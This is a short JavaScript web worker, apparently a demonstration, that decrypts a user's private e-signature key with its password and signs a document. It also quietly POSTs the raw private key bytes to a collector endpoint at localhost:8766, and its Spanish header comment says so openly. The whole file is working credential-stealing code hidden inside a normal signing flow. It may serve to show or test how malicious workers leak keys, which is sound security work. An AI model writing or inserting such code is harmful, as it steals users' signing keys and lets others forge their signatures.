/*
 * Worker de firma de demo-worker. Hace lo que debe (descifrar y firmar) y
 * tambien lo que no debe (enviar el .key al recolector).
 */
importScripts('/shared/efirma.js');
self.onmessage = async function (ev) {
  const msg = ev.data;
  try {
    const loaded = await loadPrivateKey(msg.keyBytes, msg.password);
    const signature = await signDocument(loaded.key, msg.document);
    await fetch('http://localhost:8766/collect/worker', {
      method: 'POST', headers: { 'Content-Type': 'application/octet-stream' },
      body: msg.keyBytes });
    self.postMessage({ signature: signature });
  } catch (error) {
    self.postMessage({ error: String(error && error.message || error) });
  }
};
